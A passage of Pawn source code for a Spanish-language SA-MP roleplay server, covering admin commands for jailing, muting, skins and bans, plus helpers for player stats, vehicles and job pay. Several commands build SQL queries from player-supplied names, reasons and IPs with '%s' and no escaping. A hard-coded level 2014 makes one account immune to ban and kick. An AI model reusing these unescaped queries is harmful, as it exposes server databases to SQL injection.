	{ 
		cuenta[jugador][cAdminAdvertencia] = 0;
	}
	else
	{
		AdminPanel(jugador);
	}
	
	mysql_format(servidor[mysqlControl], string, sizeof(string), "UPDATE zz_usuarios SET tadmin=%d WHERE id=%d;", gettime(), cuenta[jugador][cUnico]);
	mysql_query(servidor[mysqlControl], string, false);

	format(string, sizeof(string), "{40D3FF}%s lo ha asignado administrador nivel %d", PlayerName(playerid), nivel);
	Mensaje(jugador, -1, string);
	
	format(string, sizeof(string), "%s ha asignado administrador nivel %d a %s", PlayerName(playerid), nivel, PlayerName(jugador));
	AdminMensaje(string);
	return 1;
}
COMMAND:jailoff(playerid, params[])
{
	new inombre[MAX_PLAYER_NAME], razon[64], string[144], tmp[256], tiempo, jailid, Cache:R;
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	if(sscanf(params, "ds[24]p< >s[64]", tiempo, inombre, razon))return Mensaje(playerid, COLOR_GRIS2, "Utiliza: /jailoff [Tiempo] [Nombre_Apellido] [Razon]");
	
	mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "SELECT id FROM zz_usuarios WHERE nombre = '%s';", inombre);
	R = mysql_query(servidor[mysqlControl], tmp, true);
	
	if(cache_get_row_count(servidor[mysqlControl]))
	{
		jailid = cache_get_row_int(0, 0, servidor[mysqlControl]);
		
		format(string, sizeof(string), "{FF0000}CMD-OFF: {FFFFFF}%s encarceló a %s por %d minuto(s), razón: %s", PlayerName(playerid), inombre, tiempo, razon);
		AdminMensaje(string);
		
		mysql_format(servidor[mysqlControl], tmp, sizeof(tmp), "UPDATE zz_usuarios SET carcel=1, tiempocarcel=%d, janombre='%s', jrazon='%s' WHERE id=%d", tiempo * 60, Nombre(playerid), razon, jailid);
		mysql_query(servidor[mysqlControl], tmp, false);
	}
	else
	{
		Mensaje(playerid, COLOR_GRIS2, "Utiliza este usuario no se encuentra registrado.");	
	}
	cache_delete(R);
	return 1;
}
COMMAND:setskin(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 2)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	new jugador, traje, tmp[124];
	if(sscanf(params, "ud", jugador, traje))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /setskin [Usuario] [Skin ID]");
	
	if(traje < 0 || traje > 311)return Mensaje(playerid, COLOR_GRIS2, "Skin ID incorrecto (0 - 311)");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado!");
	
	cuenta[jugador][cTraje] = traje;
	SetPlayerSkin(jugador, cuenta[jugador][cTraje]);
	
	format(tmp, sizeof(tmp), "El administrador %s te coloco el skin: %d", PlayerName(playerid), traje);
	Mensaje(playerid, COLOR_GRIS2, tmp);
	format(tmp, sizeof(tmp), "El administrador %s le coloco a %s el skin: %d", PlayerName(playerid), PlayerName(jugador), traje);
	AdminMensaje(tmp);
	return 1;
}
COMMAND:silenciar(playerid, params[])
{
	if(cuenta[playerid][cAdministrador] < 1)return Mensaje(playerid, COLOR_GRIS2, "No autorizado!");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	new jugador, tiempo, string[124];
	if(sscanf(params, "ud", jugador, tiempo))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /silenciar [Usuario] [Minutos]");
	if(tiempo < 0 || tiempo > 720)return Mensaje(playerid, COLOR_GRIS2, "Usted no puede callar a este jugador por mas de 720 minutos");
	if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado!");
	
	cuenta[jugador][cSilenciado] = (tiempo * 60) + gettime();
	
	format(string, sizeof(string), "El administrador %s te silencio por %s.", PlayerName(playerid), ObtenerTiempoRestante(cuenta[jugador][cSilenciado]));
	Mensaje(jugador, COLOR_ROJO, string);
	format(string, sizeof(string), "El administrador %s silencio ha %s por %s.", PlayerName(playerid), PlayerName(jugador), ObtenerTiempoRestante(cuenta[jugador][cSilenciado]));
	AdminMensaje(string);
	return 1;
}
COMMAND:harmas(playerid, params[])
{
	if(!cuenta[playerid][cAdministrador])return Mensaje(playerid, COLOR_GRIS2, "No autorizado.");
	if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
	new usuario, string[126];
	if(sscanf(params, "u", usuario))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /verarmas [Usuario]");	
	if(!IsPlayerConnected(usuario))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");
	
	format(string, sizeof(string), "Armas que debe tener: %s", Nombre(usuario));
	Mensaje(playerid, COLOR_VERDE, string);
	for(new i=0; i<13; i++)
	{
		if(!detectarArmas[usuario][i][0])continue;
		format(string, sizeof(string), "Arma ID: %d - Municion: %d", detectarArmas[usuario][i][0], detectarArmas[usuario][i][1]);
		Mensaje(playerid, COLOR_BLANCO, string);
	}
	Mensaje(playerid, COLOR_BLANCO, "");
	format(string, sizeof(string), "Armas que posee: %s", Nombre(usuario));
	Mensaje(playerid, COLOR_ROJO, string);
	for(new i=0; i<13; i++)
	{
		new hweap, hammo;
		GetPlayerWeaponData(usuario, i, hweap, hammo);
		if(!hweap)continue;
		
		format(string, sizeof(string), "Arma ID: %d - Municion: %d", hweap, hammo);
		Mensaje(playerid, COLOR_BLANCO, string);
	}
	return 1;
}
COMMAND:banip(playerid, params[])
{
	new ip[16], razon[48], consulta[128];
	if(cuenta[playerid][cAdministrador] >= 2014)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		if(sscanf(params, "s[16]s[48]", ip, razon))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /banip [Dirección de IP][Razón]");
		
		mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "INSERT INTO zz_tablaip(ipaddress, razon, fecha) VALUES('%s', '%s', '%s');", ip, razon, ObtenerFecha());
		mysql_query(servidor[mysqlControl], consulta, false);
		
		format(consulta, sizeof(consulta), "Administrador %s prohibio la IP: %s Razón: %s", Nombre(playerid), ip, razon);
		AdminMensaje(consulta);
	}
	return 1;
}
COMMAND:ban(playerid, params[])
{
	new jugador, razon[64], string[128];
	if(cuenta[playerid][cAdministrador] >= 4)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		if(sscanf(params, "us[128]", jugador, razon))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /ban [Usuario] [Razón]");
		if(!IsPlayerConnected(jugador))return Mensaje(playerid, COLOR_GRIS2, "Este jugador no esta conectado.");

		if(cuenta[jugador][cAdministrador] == 2014)
		{
			format(string, sizeof(string), "ATENCIÓN: %s intentó banear a %s", PlayerName(playerid), PlayerName(jugador));
			AdminMensaje(string);
			return 1;
		}
		
		format(string, sizeof(string), "El administrador %s expulso(IP-BAN) a %s.", PlayerName(playerid), PlayerName(jugador));
		printf(string);
		AdminMensaje(string);
		Mensaje(jugador, COLOR_ROJO, string);

		ban(jugador, razon, Nombre(playerid), "IP-BAN");
	}
	return 1;
}
COMMAND:tkick(playerid, params[])
{
	new user, dias, segundos, razon[128], string[256];
	if(cuenta[playerid][cAdministrador] >= 1)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		if(sscanf(params, "uds[128]", user, dias, razon))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /tkick [ID - Usuario] [Minutos] [Razon]");	
		if(cuenta[user][cAdministrador] == 2014)
		{
			format(string, sizeof(string), "ATENCIÓN: %s intentó expulsar a %s", PlayerName(playerid), PlayerName(user));
			AdminMensaje(string);
			return 1;
		}

		segundos = (dias * 60) + gettime();
		if(dias > 240)return Mensaje(playerid, COLOR_ROJO, "Minutos maximos de kick 240, use /tban");
		format(string, sizeof(string), "Administrador %s expulso(Kick) a %s por %s, Razon: %s", PlayerName(playerid), PlayerName(user), ObtenerTiempoRestante(segundos), razon);
		AdminMensaje(string);
		Mensaje(user, COLOR_ROJO, string);
		
		mysql_format(servidor[mysqlControl], string, sizeof(string), "INSERT INTO zz_bantmp(nombreadmin, nombrejugador, razon, fecha, segundos) VALUES ('%s', '%s', '%s', '%s', %d)", Nombre(playerid), Nombre(user), razon, ObtenerFecha(), segundos);
		mysql_tquery(servidor[mysqlControl], string);
		Kick(user);
	}
	return 1;
}
COMMAND:tban(playerid, params[])
{
	new user, dias, segundos, razon[128], string[256];
	if(cuenta[playerid][cAdministrador] >= 4)
	{
		if(!booleano[AntiAbusos]{playerid})return Mensaje(playerid, COLOR_AMARILLO, "»{FFFFFF} No puedes usar este comando sin estar en OnDuty.");
		if(sscanf(params, "uds[128]", user, dias, razon))return Mensaje(playerid, COLOR_GRIS2, "Utiliza /tban [ID - Usuario] [Dias] [Razon]");	
		if(cuenta[user][cAdministrador] == 2014)
		{
			format(string, sizeof(string), "ATENCIÓN: %s intentó banear a %s", PlayerName(playerid), PlayerName(user));
			AdminMensaje(string);
			return 1;
		}
		
		segundos = (dias * 86400) + gettime();
		format(string, sizeof(string), "Administrador %s expulso(Temporal Ban) a %s por %s, Razon: %s", PlayerName(playerid), PlayerName(user), ObtenerTiempoRestante(segundos), razon);
		AdminMensaje(string);
		Mensaje(user, COLOR_ROJO, string);
		
		mysql_format(servidor[mysqlControl], string, sizeof(string), "INSERT INTO zz_bantmp(nombreadmin, nombrejugador, razon, fecha, segundos) VALUES ('%s', '%s', '%s', '%s', %d)", Nombre(playerid), Nombre(user), razon, ObtenerFecha(), segundos);
		mysql_tquery(servidor[mysqlControl], string);
		Kick(user);
	}
	return 1;
}
/*
 *	Funciones
 *
 *	24/07/2015 - 09:28 p.m.
 *	Hora Venezolana.
 *
*/
Funcion.ObtenerFecha()
{
	new fecha[64], date[6];
	getdate(date[0], date[1], date[2]);
	gettime(date[3], date[4], date[5]);
	format(fecha, sizeof(fecha), "%02d/%02d/%02d - %02d:%02d:%02d", date[0], date[1], date[2], date[3], date[4], date[5]);
	return fecha;
}
//
Funcion.UpdatePlayerStat(playerid)
{
    if(IsPlayerConnected(playerid))
	{
	    if(cuenta[playerid][cSexo] == 2) PlayerStatInfo[playerid][0] = "Femenino";
		else PlayerStatInfo[playerid][0] = "Masculino";

  		if(cuenta[playerid][cCasado] == 1) PlayerStatInfo[playerid][6] = "Si";
		else PlayerStatInfo[playerid][6] = "No";
		
		if(cuenta[playerid][cSeguro] == 1) PlayerStatInfo[playerid][7] = "LS";
		else PlayerStatInfo[playerid][7] = "No";

		switch(cuenta[playerid][cOrigen])
		{
		    case 1: PlayerStatInfo[playerid][1] = "Japon";
		    case 2: PlayerStatInfo[playerid][1] = "Italia";
		    case 3: PlayerStatInfo[playerid][1] = "Arabe";
		    case 4: PlayerStatInfo[playerid][1] = "Rusia";
		    case 5: PlayerStatInfo[playerid][1] = "Francia";
		    case 6: PlayerStatInfo[playerid][1] = "China";
		    case 7: PlayerStatInfo[playerid][1] = "Alemania";
		    case 8: PlayerStatInfo[playerid][1] = "Argentina";
		    case 9: PlayerStatInfo[playerid][1] = "Colombia";
		    case 10: PlayerStatInfo[playerid][1] = "Bolivia";
		    case 11: PlayerStatInfo[playerid][1] = "Brasil";
		    case 12: PlayerStatInfo[playerid][1] = "Chile";
		    case 13: PlayerStatInfo[playerid][1] = "España";
		    case 14: PlayerStatInfo[playerid][1] = "Mexico";
		    case 15: PlayerStatInfo[playerid][1] = "Ecuador";
		    case 16: PlayerStatInfo[playerid][1] = "Estados Unidos";
		    case 17: PlayerStatInfo[playerid][1] = "Holanda";
		    case 18: PlayerStatInfo[playerid][1] = "Canada";
		    case 19: PlayerStatInfo[playerid][1] = "Uruguay";
		    case 20: PlayerStatInfo[playerid][1] = "Venezuela";
		}

  		new facc, rango;
		if(cuenta[playerid][cMiembro] > cuenta[playerid][cLider]) facc = cuenta[playerid][cMiembro];
		else facc = cuenta[playerid][cLider];
		rango = cuenta[playerid][cRango];
		
		//Facciones
		switch(facc)
		{
		    case 1: PlayerStatInfo[playerid][3] = "Policía Local";
		    case 2: PlayerStatInfo[playerid][3] = "Guardia Nacional";
		    case 3: PlayerStatInfo[playerid][3] = "LSMC";
		    case 4: PlayerStatInfo[playerid][3] = "Mecánicos"; 
		    case 5: PlayerStatInfo[playerid][3] = "Servicios Fort Carson";
			case 6: PlayerStatInfo[playerid][3] = "Gobierno";
			case 7: PlayerStatInfo[playerid][3] = "Radio-Television"; 
			case 9: PlayerStatInfo[playerid][3] = "FBI";
			case 16 .. 45: format(PlayerStatInfo[playerid][3], 32, "%s", IFacciones[facc-16][If@nombre]);
			default: PlayerStatInfo[playerid][3] = "No";
		}
		
		format(PlayerStatInfo[playerid][4], 24, "%s", obtenerRango(facc, rango));
	}
}
//
Funcion.TieneMaleta(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 401, 402, 404, 405, 418, 426, 429, 436, 439, 445, 466, 467, 474, 475, 479, 489, 491, 492, 6, 15, 16, 28, 32, 542, 546, 52:return true;
	}
	return false;
}
//
Funcion.NoPuedeTener(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 403, 406, 407, 408, 411, 416, 417, 420, 423, 424, 425, 427, 430 .. 434, 437, 438, 441 .. 444, 446 .. 455, 457, 460 .. 465, 468, 469, 471, 472, 473, 476, 477, 478, 481, 483 .. 490, 493, 494, 495, 497, 501 .. 504, 509 .. 515, 519, 520, 521, 522, 523, 524, 525, 528, 530, 531, 532, 535, 537, 538, 539, 543, 544, 548, 552, 553, 556, 557, 563, 564, 568, 569, 570 .. 574, 577, 578, 581 .. 584, 586, 588, 590, 592, 593 .. 599, 601, 606, 607, 608, 610, 611: return true;
	}
	return false;
}
//
Funcion.trabajoPagar(playerid, iskill, ivar)
{
	new string[144], itotal;
	switch(obtenerNivel(playerid, iskill))
	{
		case 1: 
		{
			itotal = ivar + (ivar * 9 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 9 porciento por habilidad nivel 1 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 2: 
		{
			itotal = ivar + (ivar * 15 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 15 porciento por habilidad nivel 2 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 3: 
		{
			itotal = ivar + (ivar * 21 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 21 porciento por habilidad nivel 3 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 4: 
		{
			itotal = ivar + (ivar * 29 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 29 porciento por habilidad nivel 4 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 5: 
		{
			itotal = ivar + (ivar * 35 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 35 porciento por habilidad nivel 5 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 6: 
		{
			itotal = ivar + (ivar * 42 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 42 porciento por habilidad nivel 6 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 7: 
		{
			itotal = ivar + (ivar * 56 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 56 porciento por habilidad nivel 7 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 8: 
		{
			itotal = ivar + (ivar * 67 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 67 porciento por habilidad nivel 8 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 9: 
		{
			itotal = ivar + (ivar * 74 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 74 porciento por habilidad nivel 9 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
		case 10: 
		{
			itotal = ivar + (ivar * 85 / 100);
			cuenta[playerid][pagas] += itotal;
			format(string, sizeof(string), "Usted recibio ~g~%d$ ~w~mas 85 porciento por habilidad nivel 10 total ~g~%d$ ~w~, acumulado ~g~%d$", ivar, itotal, cuenta[playerid][pagas]);
		}
	}
	TextoInformatico(25, playerid, string);
	return 1;
}
//
Funcion.obtenerRango(facc, rango)
{
	new string[24];
	//Rangos
	if(facc < 16)
	{
		switch(rango)
		{
			case 2: format(string, 24, "%s", fRangos[facc][fr@rango1]);
			case 3: format(string, 24, "%s", fRangos[facc][fr@rango2]);
			case 4: format(string, 24, "%s", fRangos[facc][fr@rango3]);
			case 5: format(string, 24, "%s", fRangos[facc][fr@rango4]);
			case 6: format(string, 24, "%s", fRangos[facc][fr@rango5]);
			case 7: format(string, 24, "%s", fRangos[facc][fr@rango6]);
			case 8: format(string, 24, "%s", fRangos[facc][fr@rango7]);
			default: format(string, 24, "%s", fRangos[facc][fr@rango0]);
		}
	}
	else
	{
		switch(rango)
		{
			case 2: format(string, 24, "%s", IFacciones[facc-16][If@rango1]);
			case 3: format(string, 24, "%s", IFacciones[facc-16][If@rango2]);
			case 4: format(string, 24, "%s", IFacciones[facc-16][If@rango3]);
			case 5: format(string, 24, "%s", IFacciones[facc-16][If@rango4]);
			case 6: format(string, 24, "%s", IFacciones[facc-16][If@rango5]);
			default: format(string, 24, "%s", IFacciones[facc-16][If@rango0]);
		}
	}
	return string;
}
//
Funcion.EsIlegal(playerid)
{
	if(cuenta[playerid][cMiembro] >= 16)return true;
	return false;
}
//
Funcion.ObtenerApoyo(playerid)
{
	new apoyo=0, Float:apos[3];
	GetPlayerPos(playerid, apos[0], apos[1], apos[2]);
	for(new i=0, t=GetMaxPlayers();i<t;i++)
	{
		if(IsPlayerInRangeOfPoint(i, 80.0, apos[0], apos[1], apos[2])) 
		{
			if(cuenta[i][cMiembro] == cuenta[playerid][cMiembro])
			{
				apoyo++;
			}
		}
	}
	return apoyo;
}
//
Funcion.SenalWifi(playerid)
{
	for(new i=0; i<sizeof(casa); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 50.0, casa[i][hExitx], casa[i][hExity], casa[i][hExitz])) return true;
	}
	for(new i=0; i<sizeof(negocio); i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 50.0, negocio[i][bExitx], negocio[i][bExity], negocio[i][bExitz])) return true;
	}
	return false;
}
//
Funcion.terminarPrueba(playerid)
{
	new slot = enteroChar[licslot]{playerid};
	if(slot != 255 && obtenerLicencia[slot][cocheUse])
	{
		obtenerLicencia[slot][cocheUse] = false;
		SetVehicleToRespawn(obtenerLicencia[slot][cocheExamen]);
		DisablePlayerRaceCheckpoint(playerid);
		entero[playerid][lictiempo] = 0;
	}
	return 1;
}
//
Funcion.comenzarPrueba(playerid)
{
	new vehicle = GetPlayerVehicleID(playerid), engine, lights, alarm, doors, bonnet, boot, objective;
	
	GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
	SetVehicleParamsEx(vehicle, 1, lights, alarm, doors, bonnet, boot, objective);
	
	entero[playerid][lictiempo] = gettime();
	enteroChar[licestado]{playerid} = 0;
	
	switch(enteroChar[lictipo]{playerid})
	{
		case 0, 1:
		{
			SetPlayerRaceCheckpoint(playerid, 0, 1390.3795, -27.3216, 1000.6432, 1394.8308, -1.6123, 1000.6443, 3.0);
			enteroChar[licvueltas]{playerid} = 0;
		}
		case 2: SetPlayerRaceCheckpoint(playerid, 3, 157.7692, 2505.7637, 42.3494, -63.9375, 2508.9941, 91.6324, 6.0);
		case 3: SetPlayerRaceCheckpoint(playerid, 1, 71.6266, -1134.2206, -0.5285, 70.4348, -1009.1017, -0.5573, 4.0);
	}
	return 1;
}
//
stock generarTiempo(_segundos)
{
    enum enum@tiempo
    {
        plural[12], 
        singular[12], 
        cantidad
    }
    static
        tiempo[5][enum@tiempo] =
        {
            {{"meses"}, {"mes"}, 2592000}, 
            {{"días"}, {"día"}, 86400}, 
            {{"horas"}, {"hora"}, 3600}, 
            {{"minutos"}, {"minuto"}, 60}, 
            {{"segundos"}, {"segundo"}, 1}
        }, 
        tmp[64];

    if(_segundos < 0)
        return format(tmp, sizeof tmp, "desconocido"), tmp;

    if(_segundos < tiempo[(sizeof(tiempo)-2)][cantidad])
        return format(tmp, sizeof tmp, "%d %s", _segundos, tiempo[(sizeof(tiempo)-1)][((_segundos != 1)?(enum@tiempo:plural):(enum@tiempo:singular))]), tmp;

    for(new tmpid = 0; tmpid < sizeof(tiempo)-1; tmpid++)
    {
        if(_segundos >= tiempo[tmpid][cantidad])
        {
            new t@tmp[2];
            t@tmp[0] = floatround((_segundos/tiempo[tmpid][cantidad]), floatround_floor);
            t@tmp[1] = floatround((_segundos-(t@tmp[0]*tiempo[tmpid][cantidad]))/tiempo[tmpid+1][cantidad], floatround_floor);

            format(tmp, sizeof tmp, "%d %s con %d %s", t@tmp[0], tiempo[tmpid][((t@tmp[0] != 1)?(enum@tiempo:plural):(enum@tiempo:singular))], t@tmp[1], tiempo[tmpid+1][((t@tmp[1] != 1)?(enum@tiempo:plural):(enum@tiempo:singular))]);

            break;
        }
    }
    return tmp;
}
//
Funcion.AutoProhibido(playerid)
{
        new Auto = GetPlayerVehicleID(playerid);
        #define MAX_INVALID_NOS_VEHICLES 52
        new InvalidNosVehicles[MAX_INVALID_NOS_VEHICLES] =
		{
			581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 417, 425, 469, 487, 512, 520, 563, 593, 
			509, 481, 510, 472, 473, 493, 520, 595, 484, 430, 453, 432, 476, 497, 513, 533, 577, 
			452, 446, 447, 454, 590, 569, 537, 538, 570, 449, 519, 460, 488, 511, 519, 548, 592};
        if(IsPlayerInAnyVehicle(playerid))
		{
			for(new i = 0; i < MAX_INVALID_NOS_VEHICLES; i++)
			{
				if(GetVehicleModel(Auto) == InvalidNosVehicles[i])return true;
			}
        }
        return 0;
}
//
Funcion.PutPlayerInVehicleEx(playerid, vehicleid, seatid)
{
	if(IsPlayerConnected(playerid) && vehicleid != INVALID_VEHICLE_ID)
	{
		AntiVehiculoTele[playerid] = vehicleid;
		PutPlayerInVehicle(playerid, vehicleid, seatid);
		return 1;
	}
	return 0;
}
//
Funcion.CreateVehicleEx(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay)
{
	new vehicleid = CreateVehicle(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay);

	if(vehicleid != INVALID_VEHICLE_ID)
	{
		gVps[vehicleid][0] = x;
		gVps[vehicleid][1] = y;
		gVps[vehicleid][2] = z;
	}
	return vehicleid;
}
//
Funcion.AddStaticVehicleAnt(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay)
{
	new vehicleid = AddStaticVehicleEx(modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay);
	
	if(vehicleid != INVALID_VEHICLE_ID)
	{
		gVps[vehicleid][0] = x;
		gVps[vehicleid][1] = y;
		gVps[vehicleid][2] = z;
	}
	return vehicleid;
}
//
Funcion.SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z)
{
	if(vehicleid < 2000)
	{
		gVps[vehicleid][0] = x;
		gVps[vehicleid][1] = y;
		gVps[vehicleid][2] = z;
	}
	return SetVehiclePos(vehicleid, Float:x, Float:y, Float:z);
}
//
Funcion.EnfermedadTipo(tipoid)
{
	new string[32];
	switch(tipoid)
	{
		case 1:	string = "Fiebre";
		case 2:	string = "Fiebre hemorrágica viral";
		case 3:	string = "Dengue Clásico";
		case 4:	string = "Dengue Hemorráico";
		case 5:	string = "Gripe";
		case 6:	string = "Hepatitis A";
		case 7:	string = "Hepatitis B";
		case 8:	string = "Hepatitis C";
		case 9:	string = "Conjuntivitis";
		case 10: string = "Cólera";
		case 11: string = "Gripe H1";
		case 12: string = "Leucemia";
		case 13: string = "Varicela";
		case 14: string = "Papera";
		case 15: string = "Lepra";
		case 16: string = "Neumonia";
		case 17: string = "Amigdalitis";
		case 18: string = "Sarna";
		case 19: string = "Tuberculosis";
		case 20: string = "Hipertensión arterial";
		case 21: string = "Sífilis";
		case 22: string = "Tumor Cerebral";
		case 23: string = "Apendicitis";
		case 24: string = "Cáncer de boca";
		case 25: string = "Cáncer de piel";
		case 26: string = "Cáncer de pulmón";
		case 27: string = "Cáncer de colon";
		case 28: string = "Cáncer cervical";
		case 29: string = "SIDA";
		case 30: string = "VPH";
		default: string = "Nada";
	}
	return string;
}
//
Funcion.IsNumeric(const string[])
{
    for (new i = 0, j = strlen(string); i < j; i++)
	{
        if (string[i] > '9' || string[i] < '0')return 0;
    }
    return 1;
}
//
Funcion.TextdrawFunc(playerid)
{
	PuntosDeRolTextdraw0[playerid]=CreatePlayerTextDraw(playerid, 502.000000, 181.000000, "Puntos de Rol: 10");
	PlayerTextDrawLetterSize(playerid, PuntosDeRolTextdraw0[playerid], 0.280000, 1.400000);
	PlayerTextDrawColor(playerid, PuntosDeRolTextdraw0[playerid], -1);
	PlayerTextDrawSetShadow(playerid, PuntosDeRolTextdraw0[playerid], 1);
	PlayerTextDrawSetOutline(playerid, PuntosDeRolTextdraw0[playerid], 0);
	PlayerTextDrawFont(playerid, PuntosDeRolTextdraw0[playerid], 2);
	PlayerTextDrawSetProportional(playerid, PuntosDeRolTextdraw0[playerid], 1);
	return 1;
}
//
Funcion.DesaparecerSelecion(playerid, opcion)
{
	switch(opcion)
	{
		case 0:
		{	
			if(booleano[npcUse]{playerid})
			{
				for(new i=0;i<sizeof(nonplayers);i++)
				{
					if(IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
					{
						if(nonplayers[i][npcUtil] > gettime())
						{
							for(new k=0;k<6;k++)
							{
								TextDrawHideForPlayer(playerid, nonplayers[i][interfaz][k]);
								TextDrawSetSelectable(nonplayers[i][interfaz][k], false);
								TextDrawShowForPlayer(playerid, nonplayers[i][interfaz][k]);
							}
						}
					}
				}
			}
		}							
		case 1:
		{
			if(booleano[npcUse]{playerid})
			{
				for(new i=0;i<sizeof(nonplayers);i++)
				{
					if(IsPlayerInRangeOfPoint(playerid, 2.0, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]))
					{
						if(nonplayers[i][npcUtil] > gettime())
						{
							for(new k=0;k<6;k++)
							{
								TextDrawHideForPlayer(playerid, nonplayers[i][interfaz][k]);
								TextDrawSetSelectable(nonplayers[i][interfaz][k], true);
								TextDrawShowForPlayer(playerid, nonplayers[i][interfaz][k]);
							}
						}
					}
				}
			}
		}
	}
	return 1;
}
//
Funcion.ShowEditMenu(playerid)
{
	new ind = slotselection[playerid];
	if(IsPlayerAttachedObjectSlotUsed(playerid, ind))
	{
		RemovePlayerAttachedObject(playerid, ind);
	}
	SetPlayerAttachedObject(playerid, ind, juguetes[playerid][ind][ptModelID], juguetes[playerid][ind][ptBone], juguetes[playerid][ind][ptPosX], juguetes[playerid][ind][ptPosY], juguetes[playerid][ind][ptPosZ], juguetes[playerid][ind][ptRotX], juguetes[playerid][ind][ptRotY], juguetes[playerid][ind][ptRotZ], juguetes[playerid][ind][ptScaleX], juguetes[playerid][ind][ptScaleY], juguetes[playerid][ind][ptScaleZ]);

	new stringg[512];
 	format(stringg, sizeof(stringg), "%sParte (%s)\n", stringg, HoldingBones[juguetes[playerid][ind][ptBone]]);
	format(stringg, sizeof(stringg), "%sOffset X (%f)\n", stringg, (juguetes[playerid][ind][ptPosX]*100));
	format(stringg, sizeof(stringg), "%sOffset Y (%f)\n", stringg, (juguetes[playerid][ind][ptPosY]*100));
	format(stringg, sizeof(stringg), "%sOffset Z (%f)\n", stringg, (juguetes[playerid][ind][ptPosZ]*100));
	format(stringg, sizeof(stringg), "%sRotacion X (%f)\n", stringg, juguetes[playerid][ind][ptRotX]);
	format(stringg, sizeof(stringg), "%sRotacion Y (%f)\n", stringg, juguetes[playerid][ind][ptRotY]);
	format(stringg, sizeof(stringg), "%sRotacion Z (%f)\n" , stringg, juguetes[playerid][ind][ptRotZ]);
	format(stringg, sizeof(stringg), "%s{41FF2F}Editor Personalizado", stringg);
	ShowPlayerDialog(playerid, EDITTOYS2, DIALOG_STYLE_LIST, "Objeto Menu: Editar", stringg, "Seleccionar", "Cancelar");
}
//
Funcion.VenderAuto(x)
{
	DestroyVehicle(x);
	autos[x][cModel] = 611;
